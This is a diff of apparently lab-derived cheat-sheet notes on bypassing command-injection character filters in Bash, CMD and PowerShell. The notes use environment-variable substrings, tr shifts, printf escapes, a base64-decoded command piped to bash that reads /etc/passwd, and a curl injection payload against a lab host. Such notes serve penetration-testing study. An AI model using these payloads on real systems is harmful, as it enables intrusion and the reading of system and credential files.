@@ -4,12 +4,12 @@
 
 ## Why Slashes/Backslashes Get Blocked
 
-`/` and `\` are commonly blacklisted because:
-- They're required to write file paths
-- Blocking them prevents `/etc/passwd`, `/var/log`, `C:\Windows`, etc.
-- They're easy to enumerate as "obviously dangerous chars"
+`/` and `\` are commonly blocked because:
+- They are required to write file paths.
+- Blocking them prevents payloads like `/etc/passwd`, `/var/log`, or `C:\Windows`.
+- They are easy to identify as obviously dangerous characters.
 
-The bypass: produce the character without writing it directly. Bash/PowerShell give you several ways to extract any char from environment variables or via character transformations.
+The bypass: produce the character without writing it directly. Bash and PowerShell give you ways to extract any character from environment variables or via character transformations.
 
 ---
 
@@ -34,6 +34,7 @@ echo ${PWD:0:1}         # /
 # $LS_COLORS has many separators
 echo ${LS_COLORS:10:1}  # ;  (depends on distribution)
 ```
+> Extracts single characters (`/`, `;`) from environment variables using `${VAR:start:length}` substring syntax; adjust the offsets per distro to mine the character you need.
 
 ### Finding the right offset
 
@@ -42,6 +43,7 @@ echo ${LS_COLORS:10:1}  # ;  (depends on distribution)
 echo "${PATH}" | cat -A    # shows tabs/special chars
 for i in {0..30}; do printf "%d: %s\n" $i "${PATH:$i:1}"; done
 ```
+> Maps every character in `$PATH` to its index. Use `cat -A` to reveal hidden characters. The loop outputs each position and its character so you can find `/`, `:`, or any other useful character by index.
 
 ### Useful char sources
 
@@ -77,6 +79,7 @@ echo %HOMEPATH%
 echo %HOMEPATH:~0,1%       # \  (first char)
 echo %HOMEPATH:~6,-11%     # \  (from pos 6, ending 11 chars from end)
 ```
+> Extracts a single character (e.g., `\`) from a Windows CMD env var via `%VAR:~start,length%`; change the variable and offsets to produce the character you need.
 
 ### Common Windows vars
 
@@ -97,6 +100,7 @@ $env:HOMEPATH          # \Users\htb-student
 $env:HOMEPATH[0]       # \
 $env:PROGRAMFILES[10]  # F (specific char by index)
 ```
+> Indexes a PowerShell env var string as a char array to pull one character; swap the variable and index for the character you need.
 
 Cleaner than CMD's `~start,length` syntax.
 
@@ -105,6 +109,7 @@ Cleaner than CMD's `~start,length` syntax.
 Get-ChildItem Env:    # list all env vars
 $env:PATH.IndexOf(';') # find position of any char
 ```
+> Lists all PowerShell env vars and finds the index of a target character; change the variable and the searched char to locate a usable source.
 
 ---
 
@@ -122,8 +127,7 @@ The `tr 'set1' 'set2'` command translates set1 chars → set2 chars positionally
 echo $(tr '!-}' '"-~'<<<[)
 # \
 ```
-
-`tr '!-}' '"-~'` shifts every char by 1 position. `<<<[` provides `[` as input → output is `\`.
+> `tr '!-}' '"-~'` shifts every printable ASCII character up by one position. Feeding `[` (ASCII 91) produces `\` (ASCII 92). Use this to produce any character whose ASCII value is one greater than something you can freely type.
 
 ### Producing a semicolon
 
@@ -132,6 +136,7 @@ echo $(tr '!-}' '"-~'<<<[)
 echo $(tr '!-}' '"-~'<<<:)
 # ;
 ```
+> Shifts `:` up one ASCII position with `tr` to produce `;`; feed the character one below whatever you need.
 
 ### Producing slash
 
@@ -140,6 +145,7 @@ echo $(tr '!-}' '"-~'<<<:)
 echo $(tr '!-}' '"-~'<<<.)
 # /
 ```
+> Shifts `.` up one ASCII position with `tr` to produce `/`; feed the character one below whatever you need.
 
 ---
 
@@ -151,22 +157,26 @@ printf '\57'           # / (octal 057)
 printf '\x2f'          # / (hex 0x2f)
 printf '\x3b'          # ;
 ```
+> Emits blocked characters via `printf` octal/hex escapes; change the escape code to the ASCII value of the character you need.
 
 In a payload context:
 ```bash
 ls $(printf '\57')home   # ls /home
 ```
+> Builds the `/` of a path inline with `printf` so no literal slash appears; swap the command and path for your target.
 
 ### Single-char filename trick
 ```bash
 # Create a file whose name is the char we need, then use it
 touch /tmp/x; echo x* > /tmp/slash; cat /tmp/slash
 ```
+> Creates a file then uses globbing to derive a needed character; adjust the filename and writable path for your target.
 
 ### Base64-decode the entire command
 ```bash
 echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash   # cat /etc/passwd
 ```
+> Base64-decodes a full command and pipes it to `bash`, hiding all blocked characters; replace the base64 string with your own encoded command.
 Useful when the filter blocks specific chars but allows base64 alphanumeric + `=`.
 
 ---
@@ -182,6 +192,7 @@ curl -sk -X POST "http://154.57.164.73:30363/" \
   --data-urlencode 'ip=127.0.0.1
 ${IFS}ls${IFS}${PATH:0:1}home'
 ```
+> Combines three bypass techniques: newline as the command separator, `${IFS}` as the space replacement, and `${PATH:0:1}` to produce `/`. The filter blocks `;`, `&`, `|`, space, and `/` as literal characters but allows all three substitutions.
 
 Sent payload (decoded):
 ```
